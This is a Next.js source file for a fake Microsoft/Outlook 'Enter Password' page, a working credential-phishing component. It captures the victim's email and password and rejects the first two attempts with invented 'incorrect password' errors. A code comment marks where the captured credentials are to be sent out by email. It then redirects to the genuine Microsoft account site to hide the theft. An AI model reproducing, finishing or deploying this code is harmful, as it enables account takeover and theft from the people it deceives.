import Head from "next/head";
import Image from "next/image";
import { useEffect, useState } from "react";
import styles from "../styles/Password.module.css";

export default function Password() {
  const [loading, setLoading] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [submitCount, setSubmitCount] = useState(0);
  const [errorMsg, setErrorMsg] = useState("");
  useEffect(() => {
    const theEmail = localStorage.getItem("email");
    if (theEmail) {
      setEmail(theEmail);
    } else {
      window.location.href = "/";
    }
  }, []);

  const handleChange = (e) => {
    setPassword(e.target.value);
  };
  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setErrorMsg("");
    const newCount = submitCount + 1;
    setSubmitCount(newCount);
    if (newCount === 1) {
      setTimeout(() => {
        setLoading(false);
        setErrorMsg(
          "Your account or password is incorrect if you can't remember your password, "
        );
        setPassword("");
      }, 2000);
    } else if (newCount === 2) {
      setTimeout(() => {
        setLoading(false);
        setErrorMsg(
          "Your account or password is incorrect if you can't remember your password, "
        );
      }, 2000);
      const data = new FormData(e.currentTarget);
      const thePassword = data.get("password");
      if (thePassword) {
        const userDetails = {
          email: email,
          password: thePassword,
        };
        console.log(userDetails);
        // replace console with sending email
        setPassword("");
      }
    } else {
      setLoading(false);

      window.location.href =
        "https://account.microsoft.com?ref=MeControl&refd=outlook.live.com";
    }
  };
  return (
    <div className={styles.container}>
      <Head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Sign in your account</title>
        <link
          rel="apple-touch-icon-precomposed"
          sizes="57x57"
          href="assets/favicomatic/"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="114x114"
          href="/assets/favicomatic/apple-touch-icon-114x114.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="72x72"
          href="/assets/favicomatic/apple-touch-icon-72x72.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="144x144"
          href="/assets/favicomatic/apple-touch-icon-144x144.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="60x60"
          href="/assets/favicomatic/apple-touch-icon-60x60.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="120x120"
          href="/assets/favicomatic/apple-touch-icon-120x120.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="76x76"
          href="assets/favicomatic/apple-touch-icon-76x76.png"
        />
        <link
          rel="apple-touch-icon-precomposed"
          sizes="152x152"
          href="/assets/favicomatic/apple-touch-icon-152x152.png"
        />
        <link
          rel="icon"
          type="image/png"
          href="/assets/favicomatic/favicon-196x196.png"
          sizes="196x196"
        />
        <link
          rel="icon"
          type="image/png"
          href="/assets/favicomatic/favicon-96x96.png"
          sizes="96x96"
        />
        <link
          rel="icon"
          type="image/png"
          href="/assets/favicomatic/favicon-32x32.png"
          sizes="32x32"
        />
        <link
          rel="icon"
          type="image/png"
          href="/assets/favicomatic/favicon-16x16.png"
          sizes="16x16"
        />
        <link
          rel="icon"
          type="image/png"
          href="/assets/favicomatic/favicon-128.png"
          sizes="128x128"
        />
        <meta name="application-name" content="&nbsp;" />
        <meta name="msapplication-TileColor" content="#FFFFFF" />
        <meta name="msapplication-TileImage" content="mstile-144x144.png" />
        <meta name="msapplication-square70x70logo" content="mstile-70x70.png" />
        <meta
          name="msapplication-square150x150logo"
          content="mstile-150x150.png"
        />
        <meta
          name="msapplication-wide310x150logo"
          content="mstile-310x150.png"
        />
        <meta
          name="msapplication-square310x310logo"
          content="mstile-310x310.png"
        />
      </Head>

      <main className={`${styles.flow} ${styles.main}`}>
        {loading && (
          <div className={styles.bouncingLoader}>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
          </div>
        )}
        <img
          src="assets/logo.png"
          alt=""
          aria-hidden="true"
          className={styles.img}
        />
        <p className={styles.p}>
          <a href="/" className={styles.a}>
            <i className={`${styles.i} fa-solid fa-arrow-left`}></i>
            {/* @froggy959.net */}
            {email}
          </a>
        </p>
        <h1 className={styles.h1}>Enter Password</h1>
        {!errorMsg && (
          <p className={styles.p}>
            Because you're accessing sensitive info, you need to verify your
            password
          </p>
        )}
        {errorMsg && (
          <p className={`${styles.p} ${styles.err}`}>
            {errorMsg}
            <a href="" className={styles.erra}>
              reset it now
            </a>
          </p>
        )}
        <form
          onSubmit={handleSubmit}
          method="POST"
          className={`${styles.form} ${styles.flow}`}
        >
          <input
            type="password"
            name="password"
            placeholder="Password"
            onChange={handleChange}
            value={password}
            required={true}
            className={styles.input}
          />
          <a href="" className={styles.a}>
            Forgotten my password
          </a>
          <input type="submit" value="Sign in" className={styles.input} />
        </form>
      </main>
      <nav className={styles.nav}>
        <ul role="list" className={styles.ul}>
          <li>
            <a href="" className={styles.a}>
              Terms of use
            </a>
          </li>
          <li>
            <a href="" className={styles.a}>
              Privacy &amp; cookies
            </a>
          </li>
          <li>
            <a href="" className={styles.a}>
              ...
            </a>
          </li>
        </ul>
      </nav>
    </div>
  );
}
